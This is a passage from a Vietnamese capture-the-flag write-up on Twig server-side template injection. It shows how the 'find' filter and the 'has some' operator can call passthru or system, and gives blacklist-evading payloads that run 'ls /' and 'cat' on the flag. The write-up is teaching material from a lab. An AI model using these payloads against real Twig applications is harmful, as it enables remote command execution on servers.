+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/**
+</span></span><span class=line><span class=cl> * @internal
+</span></span><span class=line><span class=cl> */
+</span></span><span class=line><span class=cl>public static function find(Environment $env, $array, $arrow)
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    self::checkArrowInSandbox($env, $arrow, &#39;find&#39;, &#39;filter&#39;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    foreach ($array as $k =&gt; $v) {
+</span></span><span class=line><span class=cl>        if ($arrow($v, $k)) {
+</span></span><span class=line><span class=cl>            return $v;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return null;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><ul><li>Về cơ bản, ta truyền vào hàm file mảng để xử lý -> $array và tên hàm mũi tên custom đi kèm -> $arrow.</li><li>Hàm sẽ đi duyệt từng phần tử trong mảng, số thứ tự phần tử mảng lưu vào biến $k, nội dung của phần tử đó lưu vào biến $v. Biến $array lúc này sẽ được đưa vào làm tên hàm, với 2 tham số truyền vào lần lượt là nội dung phần tử và thứ tự của phần tử đó. Vừa hay là ta có thể truyền các tham số tương tự như vậy vào các hàm thực thi câu lệnh như:</li></ul><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-gdscript3 data-lang=gdscript3><span class=line><span class=cl><span class=n>system</span> <span class=p>(</span> <span class=n>string</span> <span class=o>$</span><span class=n>command</span> <span class=p>[,</span> <span class=ne>int</span> <span class=o>&amp;$</span><span class=n>return_var</span> <span class=p>]</span> <span class=p>)</span> <span class=p>:</span> <span class=n>string</span>
+</span></span><span class=line><span class=cl><span class=n>passthru</span> <span class=p>(</span> <span class=n>string</span> <span class=o>$</span><span class=n>command</span> <span class=p>[,</span> <span class=ne>int</span> <span class=o>&amp;$</span><span class=n>return_var</span> <span class=p>]</span> <span class=p>)</span>
+</span></span><span class=line><span class=cl><span class=n>exec</span> <span class=p>(</span> <span class=n>string</span> <span class=o>$</span><span class=n>command</span> <span class=p>[,</span> <span class=n>array</span> <span class=o>&amp;$</span><span class=n>output</span> <span class=p>[,</span> <span class=ne>int</span> <span class=o>&amp;$</span><span class=n>return_var</span> <span class=p>]]</span> <span class=p>)</span> <span class=p>:</span> <span class=n>string</span>
+</span></span><span class=line><span class=cl><span class=n>shell_exec</span> <span class=p>(</span> <span class=n>string</span> <span class=o>$</span><span class=n>cmd</span> <span class=p>)</span> <span class=p>:</span> <span class=n>string</span>
+</span></span></code></pre></td></tr></table></div></div><p>Từ đó, ta sẽ truyền vào $array giá trị là system hoặc passthru, và truyền vào nội dung mảng là câu lệnh cần thực hiện. Khi đó sẽ tương đương với việc thực thi PHP Code:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>system($command, 0)
+</span></span><span class=line><span class=cl>passthru($command, 0)
+</span></span></code></pre></td></tr></table></div></div><p>Để test thì tạm thời mình comment lại đoạn check blacklist để run cho tiện:
+<img src=https://hackmd.io/_uploads/SkB-05E3A.png loading=lazy alt=image><br></p><h4 id=has-some>has some</h4><p>Ngoài filter <code>find</code> ra, mình đi lượn github thì có người còn tìm được operator <code>has some</code> cũng có thể được sử dụng để RCE, với nguyên lý cũng tương tự <code>find</code>:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt> 1
+</span><span class=lnt> 2
+</span><span class=lnt> 3
+</span><span class=lnt> 4
+</span><span class=lnt> 5
+</span><span class=lnt> 6
+</span><span class=lnt> 7
+</span><span class=lnt> 8
+</span><span class=lnt> 9
+</span><span class=lnt>10
+</span><span class=lnt>11
+</span><span class=lnt>12
+</span><span class=lnt>13
+</span><span class=lnt>14
+</span><span class=lnt>15
+</span><span class=lnt>16
+</span><span class=lnt>17
+</span><span class=lnt>18
+</span><span class=lnt>19
+</span><span class=lnt>20
+</span><span class=lnt>21
+</span><span class=lnt>22
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>public function getOperators(): array
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>    &#39;has some&#39; =&gt; [&#39;precedence&#39; =&gt; 20, &#39;class&#39; =&gt; HasSomeBinary::class, &#39;associativity&#39; =&gt; ExpressionParser::OPERATOR_LEFT],
+</span></span><span class=line><span class=cl>    ...
+</span></span><span class=line><span class=cl>}
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>/**
+</span></span><span class=line><span class=cl> * @internal
+</span></span><span class=line><span class=cl> */
+</span></span><span class=line><span class=cl>public static function arraySome(Environment $env, $array, $arrow)
+</span></span><span class=line><span class=cl>{
+</span></span><span class=line><span class=cl>    self::checkArrowInSandbox($env, $arrow, &#39;has some&#39;, &#39;operator&#39;);
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    foreach ($array as $k =&gt; $v) {
+</span></span><span class=line><span class=cl>        if ($arrow($v, $k)) {
+</span></span><span class=line><span class=cl>            return true;
+</span></span><span class=line><span class=cl>        }
+</span></span><span class=line><span class=cl>    }
+</span></span><span class=line><span class=cl>
+</span></span><span class=line><span class=cl>    return false;
+</span></span><span class=line><span class=cl>}
+</span></span></code></pre></td></tr></table></div></div><ul><li>Ta vẫn có thể truyền vào một mảng và tên hàm tùy ý, nếu như hàm đó xử lý được sẽ trả về true, còn không trả về false.</li></ul><p>Đây là operator nên ta không cần sử dụng dấu <code>|</code> để apply filter mà có thể viết thẳng như sau:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{{[&#34;id&#34;] has some &#34;passthru&#34;}}
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/Sy4LksN2C.png loading=lazy alt=image><br>Cách này khá lỏd và có lẽ mình sẽ sử dụng trong một ctf challenge nào đó =)))</p><h2 id=final-payload--exploit>Final Payload & Exploit</h2><p>Tổng hợp lại để khai thác, đầu tiên mình craft payload <code>ls /</code> để đọc flag trước đã, mình sử dụng passthru thay cho system vì đỡ phải nối chuỗi 3 phát=))</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% set ls = dump({ls})|slice(15,2) %}
+</span></span><span class=line><span class=cl>{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
+</span></span><span class=line><span class=cl>{% set hyphen = _charset|slice(3,1) %}
+</span></span><span class=line><span class=cl>{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
+</span></span><span class=line><span class=cl>{% set space = dump()|slice(8,1) %}
+</span></span><span class=line><span class=cl>{% set cmd = ls~space~slash %}
+</span></span><span class=line><span class=cl>{{ {cmd}|find(pass) }}
+</span></span></code></pre></td></tr></table></div></div><p>Mình có được tên flag là: <code>flag-efbeeaddce</code>
+<img src=https://hackmd.io/_uploads/rknefsE20.png loading=lazy alt=image><br>Giờ thì craft câu lệnh đọc flag thôi:</p><div class=highlight><div class=chroma><table class=lntable><tr><td class=lntd><pre tabindex=0 class=chroma><code><span class=lnt>1
+</span><span class=lnt>2
+</span><span class=lnt>3
+</span><span class=lnt>4
+</span><span class=lnt>5
+</span><span class=lnt>6
+</span><span class=lnt>7
+</span><span class=lnt>8
+</span></code></pre></td><td class=lntd><pre tabindex=0 class=chroma><code class=language-fallback data-lang=fallback><span class=line><span class=cl>{% set cat = dump({cat})|slice(15,3) %}
+</span></span><span class=line><span class=cl>{% set pass = dump({pasthru})|slice(15,3)~dump({pasthru})|slice(17,5) %}
+</span></span><span class=line><span class=cl>{% set hyphen = _charset|slice(3,1) %}
+</span></span><span class=line><span class=cl>{% set slash = dump()|slice(10,1)|nl2br|raw|slice(4,1) %}
+</span></span><span class=line><span class=cl>{% set space = dump()|slice(8,1) %}
+</span></span><span class=line><span class=cl>{% set flag = dump({flag})|slice(15,4)~hyphen~dump({efbeeaddce})|slice(15,10) %}
+</span></span><span class=line><span class=cl>{% set cmd = cat~space~slash~flag %}
+</span></span><span class=line><span class=cl>{{ {cmd}|find(pass) }}
+</span></span></code></pre></td></tr></table></div></div><p><img src=https://hackmd.io/_uploads/Sy-Tzi4h0.png loading=lazy alt=image><br>Trên server thì flag có tên: <code>flag-edbfcbcaef</code>
+<img src=https://hackmd.io/_uploads/HyvNmsN2A.png loading=lazy alt=image><br><img src=https://hackmd.io/_uploads/SykPmoNnC.png loading=lazy alt=image><br></p><ul><li>Flag: <strong>CSCTF{Tw1g_tw1g_ssT1_n0_h4cKtr1ck5_th1S_t1M3}</strong></li></ul></section><footer class=article-footer><section class=article-tags><a href=/tags/ctf/>CTF</a></section><section class=article-copyright><svg class="icon icon-tabler icon-tabler-copyright" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round"><path stroke="none" d="M0 0h24v24H0z"/><circle cx="12" cy="12" r="9"/><path d="M14.5 9a3.5 4 0 100 6"/></svg>
+<span>Licensed under CC BY-NC-SA 4.0</span></section></footer></article><div class=disqus-container><div id=disqus_thread></div><script>window.disqus_config=function(){},function(){if(["localhost","127.0.0.1"].indexOf(window.location.hostname)!=-1){document.getElementById("disqus_thread").innerHTML="Disqus comments not available by default when the website is previewed locally.";return}var t=document,e=t.createElement("script");e.async=!0,e.src="//hugo-theme-stack.disqus.com/embed.js",e.setAttribute("data-timestamp",+new Date),(t.head||t.body).appendChild(e)}()</script><noscript>Please enable JavaScript to view the <a href=https://disqus.com/?ref_noscript>comments powered by Disqus.</a></noscript><a href=https://disqus.com class=dsq-brlink>comments powered by <span class=logo-disqus>Disqus</span></a></div><style>.disqus-container{background-color:var(--card-background);border-radius:var(--card-border-radius);box-shadow:var(--shadow-l1);padding:var(--card-padding)}</style><script>window.addEventListener("onColorSchemeChange",e=>{typeof DISQUS=="object"&&DISQUS.reset({reload:!0})})</script><footer class=site-footer><section class=copyright>&copy;
+2020 -
+2026 kev1n's Blog</section><section class=powerby>Built with <a href=https://gohugo.io/ target=_blank rel=noopener>Hugo</a><br>Theme <b><a href=https://github.com/CaiJimmy/hugo-theme-stack target=_blank rel=noopener data-version=3.33.0>Stack</a></b> designed by <a href=https://jimmycai.com target=_blank rel=noopener>Jimmy</a></section></footer><div class=pswp tabindex=-1 role=dialog aria-hidden=true><div class=pswp__bg></div><div class=pswp__scroll-wrap><div class=pswp__container><div class=pswp__item></div><div class=pswp__item></div><div class=pswp__item></div></div><div class="pswp__ui pswp__ui--hidden"><div class=pswp__top-bar><div class=pswp__counter></div><button class="pswp__button pswp__button--close" title="Close (Esc)"></button>
+<button class="pswp__button pswp__button--share" title=Share></button>
+<button class="pswp__button pswp__button--fs" title="Toggle fullscreen"></button>
+<button class="pswp__button pswp__button--zoom" title="Zoom in/out"></button><div class=pswp__preloader><div class=pswp__preloader__icn><div class=pswp__preloader__cut><div class=pswp__preloader__donut></div></div></div></div></div><div class="pswp__share-modal pswp__share-modal--hidden pswp__single-tap"><div class=pswp__share-tooltip></div></div><button class="pswp__button pswp__button--arrow--left" title="Previous (arrow left)">
+</button>
+<button class="pswp__button pswp__button--arrow--right" title="Next (arrow right)"></button><div class=pswp__caption><div class=pswp__caption__center></div></div></div></div></div><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.js integrity="sha256-ePwmChbbvXbsO02lbM3HoHbSHTHFAeChekF1xKJdleo=" crossorigin=anonymous defer></script><script src=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe-ui-default.min.js integrity="sha256-UKkzOn/w1mBxRmLLGrSeyB4e1xbrp4xylgAWb3M42pU=" crossorigin=anonymous defer></script><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/default-skin/default-skin.min.css crossorigin=anonymous><link rel=stylesheet href=https://cdn.jsdelivr.net/npm/photoswipe@4.1.3/dist/photoswipe.min.css crossorigin=anonymous></main></div><script src=https://cdn.jsdelivr.net/npm/node-vibrant@3.1.6/dist/vibrant.min.js integrity="sha256-awcR2jno4kI5X0zL8ex0vi2z+KMkF24hUW8WePSA9HM=" crossorigin=anonymous></script><script type=text/javascript src=/ts/main.c922af694cc257bf1ecc41c0dd7b0430f9114ec280ccf67cd2c6ad55f5316c4e.js defer></script><script>(function(){const e=document.createElement("link");e.href="https://fonts.googleapis.com/css2?family=Lato:wght@300;400;700&display=swap",e.type="text/css",e.rel="stylesheet",document.head.appendChild(e)})()</script></body></html>
